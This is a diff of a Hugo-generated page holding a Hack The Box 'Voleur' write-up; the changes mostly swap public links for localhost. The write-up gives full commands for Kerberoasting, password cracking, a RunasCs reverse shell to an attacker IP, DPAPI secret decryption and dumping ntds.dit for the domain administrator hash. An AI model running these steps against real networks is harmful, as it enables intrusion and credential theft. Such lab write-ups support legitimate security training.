@@ -1,24 +1,24 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto">
 
-<head><meta charset="utf-8">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="index, follow">
+<meta name="robots" content="noindex, nofollow">
 <title>Voleur - Hack The Box | Conper</title>
 <meta name="keywords" content="">
 <meta name="description" content="Difficulty: Medium 🟠">
 <meta name="author" content="">
-<link rel="canonical" href="https://conper.github.io/writeups/medium/voleur/">
-<link crossorigin="anonymous" href="https://conper.github.io/assets/css/stylesheet.36819bea596090d8b48cf10d9831382996197aa7e4fc86f792f7c08c9ca4d23b.css" integrity="sha256-NoGb6llgkNi0jPENmDE4KZYZeqfk/Ib3kvfAjJyk0js=" rel="preload stylesheet" as="style">
-<link rel="icon" href="https://conper.github.io/assets/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="https://conper.github.io/assets/favicon.ico">
-<link rel="icon" type="image/png" sizes="32x32" href="https://conper.github.io/assets/favicon.ico">
-<link rel="apple-touch-icon" href="https://conper.github.io/apple-touch-icon.png">
-<link rel="mask-icon" href="https://conper.github.io/safari-pinned-tab.svg">
+<link rel="canonical" href="http://localhost:1313/writeups/medium/voleur/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.36819bea596090d8b48cf10d9831382996197aa7e4fc86f792f7c08c9ca4d23b.css" integrity="sha256-NoGb6llgkNi0jPENmDE4KZYZeqfk/Ib3kvfAjJyk0js=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/assets/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/assets/favicon.ico">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/assets/favicon.ico">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="https://conper.github.io/writeups/medium/voleur/">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/medium/voleur/">
 <noscript>
     <style>
         #theme-toggle,
@@ -55,73 +55,7 @@
         }
 
     </style>
-</noscript><meta property="og:url" content="https://conper.github.io/writeups/medium/voleur/">
-  <meta property="og:site_name" content="Conper">
-  <meta property="og:title" content="Voleur - Hack The Box">
-  <meta property="og:description" content="Difficulty: Medium 🟠">
-  <meta property="og:locale" content="en-us">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="writeups">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Voleur - Hack The Box">
-<meta name="twitter:description" content="Difficulty: Medium 🟠">
-
-
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BreadcrumbList",
-  "itemListElement": [
-    {
-      "@type": "ListItem",
-      "position":  1 ,
-      "name": "Writeups",
-      "item": "https://conper.github.io/writeups/"
-    }, 
-    {
-      "@type": "ListItem",
-      "position":  2 ,
-      "name": "Medium machines",
-      "item": "https://conper.github.io/writeups/medium/"
-    }, 
-    {
-      "@type": "ListItem",
-      "position":  3 ,
-      "name": "Voleur - Hack The Box",
-      "item": "https://conper.github.io/writeups/medium/voleur/"
-    }
-  ]
-}
-</script>
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BlogPosting",
-  "headline": "Voleur - Hack The Box",
-  "name": "Voleur - Hack The Box",
-  "description": "Difficulty: Medium 🟠",
-  "keywords": [
-    
-  ],
-  "articleBody": "\rWe start by performing a quick port scan with Nmap to see which ports are open.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.76 Using these ports, we now perform a deeper scan, saving the results to a file called “target”.\nnmap -sCV -p445,135,139,53,88,49668,389,2222,3268,58816,5985,58833,58815,58828,3269 -n -Pn 10.10.11.76 -oN target We add the domain to the /etc/hosts file so we can resolve both the domain and the domain controller name.\nTo start hacking the machine, we are given some initial credentials.\nryan.naylor : HollowOct31Nyt When trying to enumerate SMB shares with the credentials ryan.naylor:HollowOct31Nyt, authentication fails. This is not because the credentials are wrong, but because the Active Directory server does not allow direct authentication with username and password, it requires Kerberos. In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime 'YYYY-MM-DD HH:MM:SS' impacket-getTGT voleur.htb/'ryan.naylor':'HollowOct31Nyt' Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \"$(ntpdate -q voleur.htb | awk '{print $1 \" \" $2}')\" impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly. We use office2john to extract the password hash and save it to a file.\noffice2john Access_Review.xlsx \u003e hash Then we use John The Ripper to crack the password.\njohn -w=/usr/share/wordlists/rockyou.txt hash Once we know the password, we can access the Excel file.\nWe obtain the credentials for the users svc_ldap and svc_iis.\nsvc_ldap : M1XyC9pW7qT5Vn\rsvc_iss : N5pXyW1VqM7CZ8 At this point, there’s nothing more interesting to explore.\nWe now choose svc_ldap instead of ryan.naylor for domain mapping with BloodHound, as this user has more extensive read permissions that allow collecting all relationships, ACLs, and possible escalation paths, whereas a normal user like ryan.naylor would have limited access.\nfaketime \"$(ntpdate -q voleur.htb | awk '{print $1 \" \" $2}')\" bloodhound-python -d 'voleur.htb' -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -gc 'dc.voleur.htb' -ns 10.10.11.76 -v --zip -c all We upload the resulting ZIP file to BloodHound and, analyzing the user svc_ldap, we see that they have WriteSPN permissions over the user svc_winrm and belong to the RESTORE_USERS group, which has GenericWrite permissions over lacey.miller. With these permissions, it is possible to perform a Kerberoasting Attack to extract the password hashes of these users.\nWe create another TGT, this time for the user svc_ldap.\nfaketime \"$(ntpdate -q voleur.htb | awk '{print $1 \" \" $2}')\" impacket-getTGT voleur.htb/'svc_ldap':'M1XyC9pW7qT5Vn'\rexport KRB5CCNAME=$PWD/svc_ldap.ccache Then we clone the targetedKerberoast repository and run it. It uses the svc_ldap TGT to request service tickets (SPNs) for which it has permissions. These tickets are encrypted as hashes, which we can then attempt to crack.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git faketime \"$(ntpdate -q voleur.htb | awk '{print $1 \" \" $2}')\" python3 targetedKerberoast.py -v -d 'voleur.htb' -u 'svc_ldap' --dc-host dc.voleur.htb -k Finally, we use John the Ripper to crack the hashes.\njohn -w=/usr/share/wordlists/rockyou.txt hashes We obtain a single password, and after testing which account it belongs to, we realize it is for svc_winrm.\nChecking the Excel file, we see that this user has Remote Management permissions, so we can access the machine remotely using Evil-WinRM. To do this, we generate a new TGT, this time for the svc_winrm user.\nfaketime \"$(ntpdate -q voleur.htb | awk '{print $1 \" \" $2}')\" impacket-getTGT voleur.htb/'svc_winrm':'{SVC_WINRM-PASSWORD}'\rexport KRB5CCNAME=$PWD/svc_winrm.ccache In this case, we edit /etc/krb5.conf because Evil-WinRM cannot resolve the KDC by domain name, and using the IP directly allows the connection to work correctly.\n[libdefaults]\rdefault_realm = VOLEUR.HTB\r[realms]\rVOLEUR.HTB = {\rkdc = 10.10.11.76\radmin_server = 10.10.11.76\r}\r[domain_realm]\r.voleur.htb = VOLEUR.HTB\rvoleur.htb = VOLEUR.HTB faketime \"$(ntpdate -q voleur.htb | awk '{print $1 \" \" $2}')\" evil-winrm -i dc.voleur.htb -r voleur.htb We obtain the User Flag, located in the Desktop directory.\nAs seen earlier, the user svc_ldap belongs to the RESTORE_USERS group, so if we access it, we can restore the user todd.wolfe, identified in the Excel file, whose password was provided: NightT1meP1dg3on14.\nThe first step is to upload RunasCS, an executable that allows us to run commands as another user.\nwget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip\runzip RunasCs.zip We upload it to the target machine via Evil-WinRM using the svc_winrm account.\nupload RunasCs.exe Next, we execute a Reverse Shell to access the machine as svc_ldap.\n.\\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell.exe -r 10.10.14.79:4444 Once inside, we search for the deleted user.\nGet-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects We restore it using its ObjectID.\nRestore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db With the todd.wolfe account restored, we can now access its shared resources. Before doing so, we create a TGT for this user so we can authenticate correctly and use their permissions.\nfaketime \"$(ntpdate -q voleur.htb | awk '{print $1 \" \" $2}')\" impacket-getTGT voleur.htb/'todd.wolfe':'NightT1meP1dg3on14'\rexport KRB5CCNAME=$PWD/todd.wolfe.ccache faketime \"$(ntpdate -q voleur.htb | awk '{print $1 \" \" $2}')\" impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/todd.wolfe@dc.voleur.htb Accessing the system as todd.wolfe, we can explore their AppData/Roaming/Microsoft directory, which contains critical folders like Credentials, Crypto, and Vault. These folders store sensitive information protected by DPAPI (Data Protection API), used by Windows to encrypt passwords, keys, and user certificates.\nSince we are already authenticated as the user, we can extract these files and decrypt them locally without attacking other account hashes. This exploits the known DPAPI Weakness / Credential Store Exposure, allowing us to retrieve the current user’s encrypted secrets.\nSensitive file extraction:\nMaster Key: contains the key to decrypt all of the user’s secrets. get /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/08949382-134f-4c63-b93c-ce52efc0aa88 Credentials: stores an encrypted password that can be recovered using the Master Key. get /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Credentials/772275FAD58525253490A9B0039791D3 After downloading the sensitive files, we use impacket-dpapi to decrypt them. First, using the Master Key file, the user’s SID, and their password, we obtain the Master Key hash, representing the key protecting all user secrets. This hash is then used to decrypt any file protected by DPAPI.\nimpacket-dpapi masterkey \\\r-file 08949382-134f-4c63-b93c-ce52efc0aa88 \\\r-sid S-1-5-21-3927696377-1337352550-2781715495-1110 \\\r-password NightT1meP1dg3on14 With this hash, we can decrypt files inside Credentials, which may contain passwords or other encrypted secrets stored by the user.\nimpacket-dpapi credential \\\r-file 772275FAD58525253490A9B0039791D3 \\\r-key 0xd2832547d1d5e0a01... It contains the password for the user jeremy.combs.\nThe user jeremy.combs belongs to the THIRD-LINE TECHNICIANS group, allowing us to access the group’s shared resources and review stored information, after first creating the TGT for this user.\nfaketime \"$(ntpdate -q voleur.htb | awk '{print $1 \" \" $2}')\" impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/jeremy.combs@dc.voleur.htb Within the shared resources, we find two items of interest: a note and an id_rsa file, corresponding to an SSH private key.\nThe content of the note is:\nTo identify which user owns the private key, we generate the public key from it using:\nsudo ssh-keygen -y -f id_rsa The user’s name often appears at the end of the public key, allowing us to confirm the owner.\nIn the Nmap scan performed at the start, we had already identified that the SSH service is exposed on port 2222.\nBefore using the downloaded private key, we set the proper permissions.\nchmod 600 id_rsa With the key ready, we connect to the SSH server on port 2222 using the user svc_backup.\nssh -i id_rsa -p 2222 svc_backup@voleur.htb Connecting via SSH, we see we are in a Linux environment. Inspecting the /mnt mount point, we find the Windows C: volume accessible, meaning we can access the Windows filesystem from the Linux host. Inside /mnt/c/IT/Third-Line Support, we find a new folder called Backups and within it the Active Directory folder, which contains ntds.dit and ntds.jfm.\nntds.dit is the main Active Directory database, storing user accounts, groups, policies, and password hashes.\nntds.jfm is a log file that keeps the database consistent when changes are made or recovered.\nNext, we download them to our local machine so we can use them.\nscp -i id_rsa -P 2222 \"svc_backup@voleur.htb:/mnt/c/IT/Third-Line Support/Backups/Active Directory/*\" . In addition to the AD database, we also need the SYSTEM file, which contains keys required to decrypt the hashes stored in ntds.dit. It is located at /mnt/c/IT/Third-Line Support/Backups/registry.\nscp -i id_rsa -P 2222 \"svc_backup@voleur.htb:/mnt/c/IT/Third-Line Support/Backups/Registry/SYSTEM\" . With these three files locally, we use impacket-secretsdump to extract Active Directory account hashes.\nimpacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL Among the results, we obtain the NTLM hash of the Administrator account password, which we use to request a TGT for this user. With this TGT, we can authenticate as Administrator and access their privileges.\nfaketime \"$(ntpdate -q voleur.htb | awk '{print $1 \" \" $2}')\" impacket-getTGT -hashes : voleur.htb/'Administrator'\rexport KRB5CCNAME=$PWD/Administrator.ccache faketime \"$(ntpdate -q voleur.htb | awk '{print $1 \" \" $2}')\" evil-winrm -i dc.voleur.htb -r voleur.htb Finally, we obtain the Root Flag and complete the machine!!\n",
-  "wordCount" : "1551",
-  "inLanguage": "en",
-  "datePublished": "0001-01-01T00:00:00Z",
-  "dateModified": "0001-01-01T00:00:00Z",
-  "mainEntityOfPage": {
-    "@type": "WebPage",
-    "@id": "https://conper.github.io/writeups/medium/voleur/"
-  },
-  "publisher": {
-    "@type": "Organization",
-    "name": "Conper",
-    "logo": {
-      "@type": "ImageObject",
-      "url": "https://conper.github.io/assets/favicon.ico"
-    }
-  }
-}
-</script>
+</noscript>
 </head>
 
 <body class="" id="top">
@@ -139,7 +73,7 @@
 <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="https://conper.github.io/" accesskey="h" title="Conper (Alt + H)">Conper</a>
+            <a href="http://localhost:1313/" accesskey="h" title="Conper (Alt + H)">Conper</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
@@ -165,38 +99,38 @@
         </div>
         <ul id="menu">
             <li>
-                <a href="https://conper.github.io/" title="Home">
+                <a href="http://localhost:1313/" title="Home">
                     <span>Home</span>
                 </a>
             </li>
             <li>
-                <a href="https://conper.github.io/writeups/" title="Writeups">
+                <a href="http://localhost:1313/writeups/" title="Writeups">
                     <span>Writeups</span>
                 </a>
             </li>
             <li>
-                <a href="https://conper.github.io/projects/" title="My Projects">
+                <a href="http://localhost:1313/crackmes/" title="Crackmes">
+                    <span>Crackmes</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/projects/" title="My Projects">
                     <span>My Projects</span>
                 </a>
             </li>
             <li>
-                <a href="https://conper.github.io/cybersecurity/" title="Cybersecurity">
+                <a href="http://localhost:1313/cybersecurity/" title="Cybersecurity">
                     <span>Cybersecurity</span>
                 </a>
             </li>
             <li>
-                <a href="https://conper.github.io/it/" title="IT">
+                <a href="http://localhost:1313/it/" title="IT">
                     <span>IT</span>
                 </a>
             </li>
             <li>
-                <a href="https://conper.github.io/about/" title="About Me">
+                <a href="http://localhost:1313/about/" title="About Me">
                     <span>About Me</span>
-                </a>
-            </li>
-            <li>
-                <a href="https://conper.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
-                    <span>Search</span>
                 </a>
             </li>
         </ul>
@@ -241,12 +175,12 @@ img:hover {
 </style>
 <p>We start by performing a <strong>quick port scan</strong> with <strong>Nmap</strong> to see which ports are open.</p>
 <pre tabindex="0"><code>sudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.76
-</code></pre><p><img alt="1" loading="lazy" src="https://conper.github.io/images/writeups/voleur/1.png"></p>
+</code></pre><p><img alt="1" loading="lazy" src="/images/writeups/voleur/1.png"></p>
 <p>Using these ports, we now perform a <strong>deeper scan</strong>, saving the results to a file called &ldquo;<em><strong>target</strong></em>&rdquo;.</p>
 <pre tabindex="0"><code>nmap -sCV -p445,135,139,53,88,49668,389,2222,3268,58816,5985,58833,58815,58828,3269 -n -Pn 10.10.11.76 -oN target
-</code></pre><p><img alt="2" loading="lazy" src="https://conper.github.io/images/writeups/voleur/2.png"></p>
+</code></pre><p><img alt="2" loading="lazy" src="/images/writeups/voleur/2.png"></p>
 <p>We add the domain to the <em><strong>/etc/hosts</strong></em> file so we can resolve both the <strong>domain</strong> and the <strong>domain controller</strong> name.</p>
-<p><img alt="3" loading="lazy" src="https://conper.github.io/images/writeups/voleur/3.png"></p>
+<p><img alt="3" loading="lazy" src="/images/writeups/voleur/3.png"></p>
 <p>To start hacking the machine, we are given some initial credentials.</p>
 <pre tabindex="0"><code>ryan.naylor : HollowOct31Nyt
 </code></pre><p>When trying to enumerate <strong>SMB shares</strong> with the credentials <code>ryan.naylor:HollowOct31Nyt</code>, authentication fails. This is not because the credentials are wrong, but because the <strong>Active Directory</strong> server does not allow direct authentication with username and password, it requires <strong>Kerberos</strong>. In other words, before interacting with <strong>SMB</strong>, we need a <strong>TGT</strong> (Ticket Granting Ticket) that proves our identity to the <strong>KDC</strong> (Key Distribution Center, the central server that issues authentication tickets in the domain).</p>
@@ -257,27 +191,27 @@ img:hover {
 </code></pre><p>Then, I exported the generated file to the <strong>KRB5CCNAME</strong> environment variable.</p>
 <pre tabindex="0"><code>export KRB5CCNAME=$PWD/ryan.naylor.ccache
 </code></pre><p>This tells all <strong>Kerberos</strong> tools (and <strong>SMB</strong> in our case) to use that ticket instead of attempting to authenticate directly with the password.</p>
-<p><img alt="4" loading="lazy" src="https://conper.github.io/images/writeups/voleur/4.png"></p>
+<p><img alt="4" loading="lazy" src="/images/writeups/voleur/4.png"></p>
 <p>You can use <code>klist</code> to verify that the ticket was loaded correctly.</p>
-<p><img alt="5" loading="lazy" src="https://conper.github.io/images/writeups/voleur/5.png"></p>
+<p><img alt="5" loading="lazy" src="/images/writeups/voleur/5.png"></p>
 <p>Now, to access the shared resources, instead of <code>smbclient</code> I used <code>impacket-smbclient</code>, as it offers more reliable <strong>Kerberos</strong> support and allows directly using <strong>cached tickets</strong> (-k -no-pass).</p>
 <pre tabindex="0"><code>faketime &#34;$(ntpdate -q voleur.htb | awk &#39;{print $1 &#34; &#34; $2}&#39;)&#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb
-</code></pre><p><img alt="6" loading="lazy" src="https://conper.github.io/images/writeups/voleur/6.png"></p>
+</code></pre><p><img alt="6" loading="lazy" src="/images/writeups/voleur/6.png"></p>
 <p>We found an <strong>Excel file</strong> that is password protected, so we cannot open it directly. We use <code>office2john</code> to extract the password <strong>hash</strong> and save it to a file.</p>
-<p><img alt="7" loading="lazy" src="https://conper.github.io/images/writeups/voleur/7.png"></p>
+<p><img alt="7" loading="lazy" src="/images/writeups/voleur/7.png"></p>
 <pre tabindex="0"><code>office2john Access_Review.xlsx &gt; hash
 </code></pre><p>Then we use <strong>John The Ripper</strong> to crack the password.</p>
 <pre tabindex="0"><code>john -w=/usr/share/wordlists/rockyou.txt hash
-</code></pre><p><img alt="8" loading="lazy" src="https://conper.github.io/images/writeups/voleur/8.png"></p>
+</code></pre><p><img alt="8" loading="lazy" src="/images/writeups/voleur/8.png"></p>
 <p>Once we know the password, we can access the <strong>Excel file</strong>.</p>
-<p><img alt="9" loading="lazy" src="https://conper.github.io/images/writeups/voleur/9.png"></p>
+<p><img alt="9" loading="lazy" src="/images/writeups/voleur/9.png"></p>
 <p>We obtain the credentials for the users <strong>svc_ldap</strong> and <strong>svc_iis</strong>.</p>
 <pre tabindex="0"><code>svc_ldap : M1XyC9pW7qT5Vn
 svc_iss : N5pXyW1VqM7CZ8
 </code></pre><p>At this point, there’s nothing more interesting to explore.</p>
 <p>We now choose <strong>svc_ldap</strong> instead of <strong>ryan.naylor</strong> for domain mapping with <a href="https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart"><strong>BloodHound</strong></a>, as this user has more extensive <strong>read permissions</strong> that allow collecting all <strong>relationships</strong>, <strong>ACLs</strong>, and possible <strong>escalation paths</strong>, whereas a normal user like <strong>ryan.naylor</strong> would have limited access.</p>
 <pre tabindex="0"><code>faketime &#34;$(ntpdate -q voleur.htb | awk &#39;{print $1 &#34; &#34; $2}&#39;)&#34; bloodhound-python -d &#39;voleur.htb&#39; -u &#39;svc_ldap&#39; -p &#39;M1XyC9pW7qT5Vn&#39; -gc &#39;dc.voleur.htb&#39; -ns 10.10.11.76 -v --zip -c all
-</code></pre><p><img alt="10" loading="lazy" src="https://conper.github.io/images/writeups/voleur/10.png"></p>
+</code></pre><p><img alt="10" loading="lazy" src="/images/writeups/voleur/10.png"></p>
 <p>We upload the resulting <strong>ZIP</strong> file to <strong>BloodHound</strong> and, analyzing the user <strong>svc_ldap</strong>, we see that they have <code>WriteSPN</code> permissions over the user <strong>svc_winrm</strong> and belong to the <strong>RESTORE_USERS</strong> group, which has <code>GenericWrite</code> permissions over <strong>lacey.miller</strong>. With these permissions, it is possible to perform a <strong>Kerberoasting Attack</strong> to <strong>extract the password hashes</strong> of these users.</p>
 <p>We create another <strong>TGT</strong>, this time for the user <strong>svc_ldap</strong>.</p>
 <pre tabindex="0"><code>faketime &#34;$(ntpdate -q voleur.htb | awk &#39;{print $1 &#34; &#34; $2}&#39;)&#34; impacket-getTGT voleur.htb/&#39;svc_ldap&#39;:&#39;M1XyC9pW7qT5Vn&#39;
@@ -285,10 +219,10 @@ export KRB5CCNAME=$PWD/svc_ldap.ccache
 </code></pre><p>Then we clone the <a href="https://github.com/ShutdownRepo/targetedKerberoast/tree/main"><strong>targetedKerberoast</strong></a> repository and run it. It uses the <strong>svc_ldap TGT</strong> to request service tickets (<strong>SPNs</strong>) for which it has permissions. These tickets are encrypted as <strong>hashes</strong>, which we can then attempt to <strong>crack</strong>.</p>
 <pre tabindex="0"><code>git clone https://github.com/ShutdownRepo/targetedKerberoast.git
 </code></pre><pre tabindex="0"><code>faketime &#34;$(ntpdate -q voleur.htb | awk &#39;{print $1 &#34; &#34; $2}&#39;)&#34; python3 targetedKerberoast.py -v -d &#39;voleur.htb&#39; -u &#39;svc_ldap&#39; --dc-host dc.voleur.htb -k
-</code></pre><p><img alt="11" loading="lazy" src="https://conper.github.io/images/writeups/voleur/11.png"></p>
+</code></pre><p><img alt="11" loading="lazy" src="/images/writeups/voleur/11.png"></p>
 <p>Finally, we use <strong>John the Ripper</strong> to crack the hashes.</p>
 <pre tabindex="0"><code>john -w=/usr/share/wordlists/rockyou.txt hashes
-</code></pre><p><img alt="12" loading="lazy" src="https://conper.github.io/images/writeups/voleur/12.1.png"></p>
+</code></pre><p><img alt="12" loading="lazy" src="/images/writeups/voleur/12.1.png"></p>
 <p>We obtain a single <strong>password</strong>, and after testing which account it belongs to, we realize it is for <strong>svc_winrm</strong>.</p>
 <p>Checking the <strong>Excel</strong> file, we see that this user has <strong>Remote Management</strong> permissions, so we can access the machine remotely using Evil-WinRM. To do this, we generate a new <strong>TGT</strong>, this time for the <strong>svc_winrm</strong> user.</p>
 <pre tabindex="0"><code>faketime &#34;$(ntpdate -q voleur.htb | awk &#39;{print $1 &#34; &#34; $2}&#39;)&#34; impacket-getTGT voleur.htb/&#39;svc_winrm&#39;:&#39;{SVC_WINRM-PASSWORD}&#39;
@@ -307,7 +241,7 @@ export KRB5CCNAME=$PWD/svc_winrm.ccache
   .voleur.htb = VOLEUR.HTB
   voleur.htb = VOLEUR.HTB
 </code></pre><pre tabindex="0"><code>faketime &#34;$(ntpdate -q voleur.htb | awk &#39;{print $1 &#34; &#34; $2}&#39;)&#34; evil-winrm -i dc.voleur.htb -r voleur.htb
-</code></pre><p><img alt="13" loading="lazy" src="https://conper.github.io/images/writeups/voleur/13.png"></p>
+</code></pre><p><img alt="13" loading="lazy" src="/images/writeups/voleur/13.png"></p>
 <p>We obtain the <strong>User Flag</strong>, located in the <strong>Desktop</strong> directory.</p>
 <p>As seen earlier, the user <strong>svc_ldap</strong> belongs to the <strong>RESTORE_USERS</strong> group, so if we access it, we can restore the user <strong>todd.wolfe</strong>, identified in the <strong>Excel</strong> file, whose password was provided: <code>NightT1meP1dg3on14</code>.</p>
 <p>The first step is to upload <strong>RunasCS</strong>, an executable that allows us to run commands as another user.</p>
@@ -317,21 +251,21 @@ unzip RunasCs.zip
 <pre tabindex="0"><code>upload RunasCs.exe
 </code></pre><p>Next, we execute a <strong>Reverse Shell</strong> to access the machine as <strong>svc_ldap</strong>.</p>
 <pre tabindex="0"><code>.\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell.exe -r 10.10.14.79:4444
-</code></pre><p><img alt="14" loading="lazy" src="https://conper.github.io/images/writeups/voleur/14.png"></p>
+</code></pre><p><img alt="14" loading="lazy" src="/images/writeups/voleur/14.png"></p>
 <p>Once inside, we <strong>search for the deleted user</strong>.</p>
 <pre tabindex="0"><code>Get-ADObject -Filter &#39;isDeleted -eq $true&#39; -IncludeDeletedObjects
-</code></pre><p><img alt="15" loading="lazy" src="https://conper.github.io/images/writeups/voleur/15.png"></p>
+</code></pre><p><img alt="15" loading="lazy" src="/images/writeups/voleur/15.png"></p>
 <p>We <strong>restore</strong> it using its <strong>ObjectID</strong>.</p>
 <pre tabindex="0"><code>Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
-</code></pre><p><img alt="16" loading="lazy" src="https://conper.github.io/images/writeups/voleur/16.png"></p>
+</code></pre><p><img alt="16" loading="lazy" src="/images/writeups/voleur/16.png"></p>
 <p>With the <strong>todd.wolfe</strong> account restored, we can now access its shared resources. Before doing so, we create a <strong>TGT</strong> for this user so we can authenticate correctly and use their permissions.</p>
 <pre tabindex="0"><code>faketime &#34;$(ntpdate -q voleur.htb | awk &#39;{print $1 &#34; &#34; $2}&#39;)&#34; impacket-getTGT voleur.htb/&#39;todd.wolfe&#39;:&#39;NightT1meP1dg3on14&#39;
 export KRB5CCNAME=$PWD/todd.wolfe.ccache
 </code></pre><pre tabindex="0"><code>faketime &#34;$(ntpdate -q voleur.htb | awk &#39;{print $1 &#34; &#34; $2}&#39;)&#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/todd.wolfe@dc.voleur.htb
 </code></pre><p>Accessing the system as <strong>todd.wolfe</strong>, we can explore their <code>AppData/Roaming/Microsoft</code> directory, which contains critical folders like <strong>Credentials</strong>, <strong>Crypto</strong>, and <strong>Vault</strong>. These folders store sensitive information protected by <strong>DPAPI</strong> (Data Protection API), used by <strong>Windows</strong> to encrypt <strong>passwords</strong>, <strong>keys</strong>, and <strong>user certificates</strong>.</p>
 <p>Since we are already authenticated as the user, we can extract these files and <strong>decrypt</strong> them locally without attacking other account hashes. This exploits the known <strong>DPAPI Weakness</strong> / <strong>Credential Store Exposure</strong>, allowing us to retrieve the current user’s encrypted secrets.</p>
-<p><img alt="16.1" loading="lazy" src="https://conper.github.io/images/writeups/voleur/16.1.png"></p>
-<p><img alt="16.2" loading="lazy" src="https://conper.github.io/images/writeups/voleur/16.2.png"></p>
+<p><img alt="16.1" loading="lazy" src="/images/writeups/voleur/16.1.png"></p>
+<p><img alt="16.2" loading="lazy" src="/images/writeups/voleur/16.2.png"></p>
 <p><strong>Sensitive file extraction:</strong></p>
 <ul>
 <li><strong>Master Key</strong>: contains the key to decrypt all of the user’s secrets.</li>
@@ -346,32 +280,32 @@ export KRB5CCNAME=$PWD/todd.wolfe.ccache
     -file 08949382-134f-4c63-b93c-ce52efc0aa88 \
     -sid S-1-5-21-3927696377-1337352550-2781715495-1110 \
     -password NightT1meP1dg3on14
-</code></pre><p><img alt="17" loading="lazy" src="https://conper.github.io/images/writeups/voleur/17.png"></p>
+</code></pre><p><img alt="17" loading="lazy" src="/images/writeups/voleur/17.png"></p>
 <p>With this <strong>hash</strong>, <strong>we can decrypt files inside Credentials</strong>, which may contain passwords or other encrypted secrets stored by the user.</p>
 <pre tabindex="0"><code>impacket-dpapi credential \
     -file 772275FAD58525253490A9B0039791D3 \
     -key 0xd2832547d1d5e0a01...
-</code></pre><p><img alt="18" loading="lazy" src="https://conper.github.io/images/writeups/voleur/18.png"></p>
+</code></pre><p><img alt="18" loading="lazy" src="/images/writeups/voleur/18.png"></p>
 <p>It contains the password for the user <strong>jeremy.combs</strong>.</p>
-<p><img alt="19" loading="lazy" src="https://conper.github.io/images/writeups/voleur/19.png"></p>
+<p><img alt="19" loading="lazy" src="/images/writeups/voleur/19.png"></p>
 <p>The user <strong>jeremy.combs</strong> belongs to the <strong>THIRD-LINE TECHNICIANS</strong> group, allowing us to access the group’s shared resources and review stored information, after first creating the <strong>TGT</strong> for this user.</p>
 <pre tabindex="0"><code>faketime &#34;$(ntpdate -q voleur.htb | awk &#39;{print $1 &#34; &#34; $2}&#39;)&#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/jeremy.combs@dc.voleur.htb
-</code></pre><p><img alt="20" loading="lazy" src="https://conper.github.io/images/writeups/voleur/20.png"></p>
+</code></pre><p><img alt="20" loading="lazy" src="/images/writeups/voleur/20.png"></p>
 <p>Within the shared resources, we find two items of interest: a <strong>note</strong> and an <strong>id_rsa</strong> file, corresponding to an <strong>SSH private key</strong>.</p>
 <p>The content of the note is:</p>
-<p><img alt="21" loading="lazy" src="https://conper.github.io/images/writeups/voleur/21.png"></p>
